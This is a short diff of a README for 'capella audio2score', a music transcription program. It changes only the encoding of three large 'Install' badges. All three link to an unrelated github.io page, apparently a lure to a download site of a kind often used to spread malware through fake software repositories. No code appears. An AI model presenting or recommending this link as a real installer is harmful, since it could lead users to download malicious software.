@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install capella audio2score](https://img.shields.io/badge/⬇_Install_capella%20audio2score-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install capella audio2score](https://img.shields.io/badge/⬇_Install_capella+audio2score-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ capella audio2score is an automatic music transcription software that converts a
 
 <div align="center">
 
-[![⬇ Install capella audio2score](https://img.shields.io/badge/⬇_Install_capella%20audio2score-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install capella audio2score](https://img.shields.io/badge/⬇_Install_capella+audio2score-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ capella audio2score is an automatic music transcription software that converts a
 
 <div align="center">
 
-[![⬇ Install capella audio2score](https://img.shields.io/badge/⬇_Install_capella%20audio2score-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install capella audio2score](https://img.shields.io/badge/⬇_Install_capella+audio2score-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
